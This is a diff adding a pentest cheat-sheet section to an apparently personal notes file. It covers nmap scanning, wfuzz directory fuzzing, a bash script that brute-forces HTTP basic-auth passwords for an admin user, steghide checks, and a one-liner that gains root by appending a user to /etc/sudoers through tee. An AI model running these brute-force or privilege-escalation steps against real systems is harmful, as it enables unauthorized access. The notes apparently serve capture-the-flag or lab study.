@@ -167,3 +167,68 @@ Execute the following in the remote machine.
 ssh -R 3000:127.0.0.1:3000 <your-user>@<your-ip> -N -f
 ```
 
+# PENETRATION TESTING STEPS
+1 . Make a ping and try to detect the OS of the machine
+```ssh
+ping -c 10 <ip>
+```
+
+2. Scan for open ports
+```ssh
+nmap -p- --open -T5 -v -n <remote-ip>
+```
+
+3. Detect services running on open ports
+```
+nmap -sC -sV -p <ports separated by commas>
+```
+
+4. In case of a web server try wfuzz:
+```bash
+wfuzz -c --hc=404 -w <dictionary> http://<remote-ip>/FUZZ1
+```
+
+5. Run a dictionary agains the web:
+```
+wfuzz -w dictionary.txt http://<remote-ip>
+```
+
+6. A script to make a brute force to a website asking credentials with a prompt
+```bash
+#!/bin/bash
+
+function ctrl_c(){
+  echo -e "\n[!] Exiting..\n"
+  tput cnorm; exit 1;
+  exit 1
+}
+
+trap ctrl_c INT
+
+# Hide a cursor
+tput civis
+
+for password in $(cat diccionario.txt); do
+  curl -s -X GET http://<ip>/inferno --user admin:$password | html2text| grep "Unauthorized" &>/dev/null
+  
+  if [ "$(echo $?)" -ne "0" ]; then
+    echo -e "\n[*] THe password of user admin is $password\n"
+    exit 0
+  fi
+done; tput cnorm;
+
+```
+7. How to authenticate using curl on a website with user/password promt:
+```
+curl -X GET -s http://<ip>/admin --user user:password
+```
+
+# Testing estenografia 
+```
+steghide info <picture.jpg>
+```
+# Add a user to sudoers to scale privileges thanks of having "tee" command with suid
+```sudo
+echo "<user> ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
+```
+
